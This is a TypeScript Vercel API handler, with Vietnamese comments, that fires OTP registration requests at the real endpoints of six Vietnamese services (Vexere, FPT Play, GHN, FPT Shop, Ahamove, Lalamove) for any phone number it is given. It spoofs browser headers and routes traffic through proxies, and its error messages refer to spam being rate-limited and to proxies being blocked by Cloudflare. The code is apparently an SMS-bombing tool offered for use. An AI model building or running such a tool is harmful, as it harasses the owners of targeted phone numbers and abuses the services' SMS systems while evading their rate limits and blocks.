
import type { VercelRequest, VercelResponse } from '@vercel/node';
import { HttpsProxyAgent } from 'https-proxy-agent';
import fetch from 'node-fetch';

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { serviceId, phone, proxyConfig } = req.body;
  
  if (!serviceId || !phone) {
    return res.status(400).json({ error: 'Thiếu số điện thoại hoặc dịch vụ' });
  }

  const phoneClean = phone.replace(/\s+/g, '');
  const phoneWith84 = phoneClean.startsWith('0') ? '84' + phoneClean.substring(1) : phoneClean;

  let agent = null;
  if (proxyConfig && proxyConfig.host && proxyConfig.port) {
    const { host, port, user, pass } = proxyConfig;
    // Sử dụng giao thức http cho cả proxy https vì hầu hết proxy cá nhân là http tunnel
    const proxyUrl = user && pass 
      ? `http://${user}:${pass}@${host}:${port}`
      : `http://${host}:${port}`;
    
    try {
      agent = new HttpsProxyAgent(proxyUrl);
    } catch (e) {
      console.error("Proxy Agent Init Error:", e);
    }
  }

  try {
    let url = '';
    let bodyData: any = {};
    let method = 'POST';
    let headers: any = {
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
      'Content-Type': 'application/json',
      'X-Requested-With': 'XMLHttpRequest',
      'Connection': 'keep-alive'
    };

    // Cập nhật các endpoint OTP có tỷ lệ sống cao
    switch (serviceId) {
      case 'vexere':
        url = 'https://api.vexere.com/v1/user/otp';
        bodyData = { phone: phoneClean, type: 'register' };
        headers['Origin'] = 'https://vexere.com';
        headers['Referer'] = 'https://vexere.com/';
        break;
      case 'fptplay':
        url = 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp';
        bodyData = { phone: phoneClean, platform: 'web' };
        headers['Origin'] = 'https://fptplay.vn';
        break;
      case 'ghn':
        url = 'https://sso.ghn.vn/v2/otp/send';
        bodyData = { phone: phoneClean };
        headers['Origin'] = 'https://sso.ghn.vn';
        break;
      case 'fptshop':
        url = 'https://fptshop.com.vn/api-fsh/customer/get-otp';
        bodyData = { phoneNumber: phoneClean, type: 1 };
        headers['Referer'] = 'https://fptshop.com.vn/';
        break;
      case 'ahamove':
        url = 'https://app.ahamove.com/api/v1/user/otp';
        bodyData = { mobile: phoneWith84 };
        break;
      case 'lalamove':
        url = 'https://www.lalamove.com/api/v1/otp/send';
        bodyData = { phone: phoneWith84, country: 'VN' };
        break;
      default:
        return res.status(400).json({ error: 'Dịch vụ không xác định' });
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 12000); // 12 giây timeout

    const response = await fetch(url, {
      method: method,
      headers: headers,
      body: JSON.stringify(bodyData),
      agent: agent,
      signal: controller.signal as any
    });

    clearTimeout(timeout);
    
    const status = response.status;
    const resText = await response.text();
    let resJson: any = {};
    try { resJson = JSON.parse(resText); } catch(e) {}

    // Một số API trả về 200 nhưng Success: false trong JSON
    const isActuallySuccess = response.ok && (resJson.success !== false && resJson.error !== true);

    if (isActuallySuccess) {
      return res.status(200).json({ 
        success: true, 
        message: "Yêu cầu đã được gửi",
        proxy: proxyConfig ? `${proxyConfig.host}:${proxyConfig.port}` : 'Direct'
      });
    } else {
      // Phân tích lỗi cụ thể
      let errorDetail = resJson.message || resJson.error || "Bị chặn bởi dịch vụ";
      if (status === 429) errorDetail = "Spam quá nhanh (Rate Limit)";
      if (status === 403) errorDetail = "Proxy bị Cloudflare chặn (403)";
      
      return res.status(200).json({ 
        success: false, 
        message: errorDetail,
        status: status
      });
    }

  } catch (error: any) {
    let errMsg = "Lỗi kết nối";
    if (error.name === 'AbortError') errMsg = "Proxy phản hồi chậm (Timeout)";
    if (error.code === 'ECONNREFUSED') errMsg = "Proxy chết hoặc sai Port";
    if (error.message.includes('407')) errMsg = "Proxy sai User/Pass (407)";
    
    return res.status(200).json({ 
      success: false, 
      message: errMsg,
      error: error.message
    });
  }
}
